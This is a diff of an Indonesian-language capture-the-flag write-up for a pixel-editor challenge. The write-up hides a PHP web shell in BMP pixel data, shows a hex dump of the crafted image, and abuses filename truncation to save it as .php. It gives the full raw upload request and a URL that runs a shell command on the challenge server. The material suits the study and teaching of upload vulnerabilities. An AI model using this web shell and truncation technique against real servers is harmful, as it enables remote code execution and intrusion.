@@ -67,19 +67,54 @@ print payloadd
 
 kemudian saya membuat script python untuk membuat payload dalam bentuk rgb 32*32,
 menggunakan payload di atas kita bisa mendapatkan file `.bmp` dengan 
-backdoor php didalamnya `<?php system($_GET['c']); ?>` tapi kita tidak bisa
-mengeksekusi php pada format file .bmp, karena menggunakan nullbyte(%00) tidak
-berhasil karena php yang digunakan adalah versi 7, ternyata ada komentar yang menarik
-pada file javascript http://pixeditor.challs.malice.fr/js/pixeditor.js 
+backdoor php didalamnya `<?php system($_GET['c']); ?>`.
+
+```
+Sun 18:51:00 with root in CTF-i/nuitduhack/pixeditor via 🐘 v7.1.14 
+•% ➜ xxd img.bmp
+00000000: 424d 360c 0000 0000 0000 3600 0000 2800  BM6.......6...(.
+00000010: 0000 2000 0000 2000 0000 0100 1800 0000  .. ... .........
+00000020: 0000 000c 0000 0000 0000 0000 0000 0000  ................
+00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+--SNIP--
+00000bc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000bd0: 0000 0000 0000 3c3f 7068 7020 7379 7374  ......<?php syst
+00000be0: 656d 2824 5f47 4554 5b27 6327 5d29 3b3f  em($_GET['c']);?
+00000bf0: 3e49 4847 4d4c 4b58 5a4f 0000 0000 0000  >IHGMLKXZO......
+00000c00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000c10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000c20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000c30: 0000 0000 0000                           ......
+```
+ 
+tapi kita tidak bisa mengeksekusi php pada format file .bmp ataupun format gambar lainnya 
+saya mencoba menggunakan nullbyte(%00) namun tidak berhasil karena php yang digunakan adalah versi 7,
+berarti kita harus mencoba cari cara lain untuk membuat nama filenya menjadi extensi php yang akan
+membuat script php kita tereksekusi, setelah mencari cara2 lain ternyata ada komentar yang menarik
+pada file javascript http://pixeditor.challs.malice.fr/js/pixeditor.js
+ 
 `inputName.maxLength = 45; // 50 - Len(Extension) - Filename will be truncated if len > 50`
-jika input kita lebih dari 50 maka akan di truncate
+
+jika input kita lebih dari 50 maka akan di truncate, maka kita menggunakan 46 karakter untuk namafilenya
+dan 4 karakter untuk extensi .php dan ditambah .bmp yang nantinya akan di truncate
 
 ```python
+
 python -c 'print "a"*46+".php.bmp"'
 # aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php.bmp
+# 1                                           46  50 [Truncated]
+# Result : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php 
 ```
 
-our final request look like this
+Kemudian kirimkan semua payload dan menggunakan filename yang 54 karakter kita buat di atas, 
+raw request lengkapnya seperti di bawah ini.
 
 ```
 POST /save.php HTTP/1.1
@@ -99,7 +134,8 @@ data=[112,63,60,88,32,112,104,121,115,121,115,115,109,101,116,100,95,36,40,104,8
 &name=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php.bmp&format=BMP
 ```
 
-And we got a RCE
+dan kita dapat megeksekusi command pada server soal, selanjutnya seperti biasa 
+kita harus menemukan lokasi flag dan ambil isi flag nya.
 ```
 view-source:http://pixeditor.challs.malice.fr/images/863fe26761ce67aa88fda11a326f5a5a1c1e5b73f6bf9ef4a773ad010d308e93/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php?c=find%20/%20-type%20f%20-name%20flag
 > /flag
